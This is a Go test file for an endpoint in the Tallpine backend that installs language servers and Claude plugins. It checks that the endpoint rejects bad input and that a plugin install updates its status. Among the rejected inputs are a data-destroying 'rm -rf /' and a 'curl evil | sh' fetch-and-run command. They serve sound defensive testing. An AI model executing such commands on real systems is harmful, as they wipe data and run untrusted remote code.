package controllers_test

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"

	"tallpine.eu/tallpine/backend/internal/domain"
	"tallpine.eu/tallpine/backend/internal/httpd/controllers"
	projectsvc "tallpine.eu/tallpine/backend/internal/service/project"
	"tallpine.eu/tallpine/backend/internal/skillbridge"
)

func lspInstallRouter(t *testing.T, env map[string]string, c *controllers.ProjectSkillsController) func(method, path, body string) *httptest.ResponseRecorder {
	t.Helper()
	c.Projects = skillsProjects{projectsvc.GetResult{Project: &projectsvc.Project{Path: t.TempDir(), Config: &domain.ProjectConfig{Env: env}}}}
	r := chi.NewRouter()
	c.Register(r)
	return func(method, path, body string) *httptest.ResponseRecorder {
		rec := httptest.NewRecorder()
		r.ServeHTTP(rec, httptest.NewRequest(method, path, strings.NewReader(body)))
		return rec
	}
}

func TestLSPInstallAPI_RejectsUnknownIDsAndCommands(t *testing.T) {
	ran := false
	in := &skillbridge.LSPInstaller{Run: func(context.Context, []string, []string, io.Writer) error { ran = true; return nil }}
	do := lspInstallRouter(t, map[string]string{"HOME": t.TempDir()}, &controllers.ProjectSkillsController{LSPInstaller: in})
	for _, body := range []string{
		`{"language":"cobol","target":"binary"}`,
		`{"language":"go","target":"rm -rf /"}`,
		`{"language":"go","target":"binary","command":"curl evil | sh"}`,
		`{"language":"swift","target":"binary"}`,
	} {
		if rec := do(http.MethodPost, "/projects/p/skills/lsp/install", body); rec.Code != http.StatusBadRequest {
			t.Fatalf("%s: %d %s, want 400", body, rec.Code, rec.Body)
		}
	}
	rec := do(http.MethodGet, "/projects/p/skills/lsp/install", "")
	if rec.Code != http.StatusOK || strings.Contains(rec.Body.String(), "job") || ran {
		t.Fatalf("a rejected request must start nothing: %d %s ran=%v", rec.Code, rec.Body, ran)
	}
}

// The plugin installs under the Claude account Tallpine sessions launch with;
// that folder links plugins/ to the computer's ~/.claude (agentaccount.Prepare),
// so the skills page re-read after the job shows the plugin installed.
func TestLSPInstallAPI_PluginInstallsInSessionAccountAndStatusFlips(t *testing.T) {
	home, account := t.TempDir(), t.TempDir()
	shared := filepath.Join(home, ".claude", "plugins")
	if err := os.MkdirAll(shared, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(shared, filepath.Join(account, "plugins")); err != nil {
		t.Fatal(err)
	}
	var argvs [][]string
	var envs [][]string
	in := &skillbridge.LSPInstaller{
		Claude: func(context.Context) (string, error) { return "/opt/claude", nil },
		Run: func(_ context.Context, env, argv []string, out io.Writer) error {
			argvs, envs = append(argvs, argv), append(envs, env)
			if slices.Contains(argv, "install") {
				_, _ = io.WriteString(out, "Installed gopls-lsp\n")
				index := `{"version":2,"plugins":{"gopls-lsp@claude-plugins-official":[{"scope":"user","installPath":"/x","version":"1.0.0"}]}}`
				return os.WriteFile(filepath.Join(account, "plugins", "installed_plugins.json"), []byte(index), 0o600)
			}
			return nil
		},
	}
	c := &controllers.ProjectSkillsController{LSPInstaller: in, ClaudeSessionEnv: func(context.Context) (map[string]string, error) {
		return map[string]string{"CLAUDE_CONFIG_DIR": account}, nil
	}}
	do := lspInstallRouter(t, map[string]string{"HOME": home, "CLAUDE_CONFIG_DIR": ""}, c)

	installed := func() bool {
		var resp controllers.ProjectSkillsResponse
		if err := json.Unmarshal(do(http.MethodGet, "/projects/p/skills", "").Body.Bytes(), &resp); err != nil {
			t.Fatal(err)
		}
		i := slices.IndexFunc(resp.Plugins, func(p controllers.ProjectPlugin) bool { return p.ID == "gopls-lsp@claude-plugins-official" })
		return i >= 0 && resp.Plugins[i].Installed
	}
	if installed() {
		t.Fatal("plugin installed before the install ran")
	}
	if rec := do(http.MethodPost, "/projects/p/skills/lsp/install", `{"language":"go","target":"plugin"}`); rec.Code != http.StatusAccepted {
		t.Fatalf("start: %d %s", rec.Code, rec.Body)
	}
	var st controllers.ProjectLSPInstallStatus
	for deadline := time.Now().Add(5 * time.Second); time.Now().Before(deadline); time.Sleep(5 * time.Millisecond) {
		if err := json.Unmarshal(do(http.MethodGet, "/projects/p/skills/lsp/install", "").Body.Bytes(), &st); err != nil {
			t.Fatal(err)
		}
		if st.Job != nil && st.Job.State != skillbridge.LSPInstallRunning {
			break
		}
	}
	if st.Job == nil || st.Job.State != skillbridge.LSPInstallSucceeded || !strings.Contains(st.Job.Output, "Installed gopls-lsp") || st.Job.FinishedAt == nil {
		t.Fatalf("job = %+v", st.Job)
	}
	if len(argvs) != 2 || argvs[0][3] != "add" || !slices.Contains(envs[1], "CLAUDE_CONFIG_DIR="+account) {
		t.Fatalf("want marketplace add then install under the account dir; ran %v", argvs)
	}
	if !installed() {
		t.Fatal("the skills page still shows the plugin missing after a successful install")
	}
}
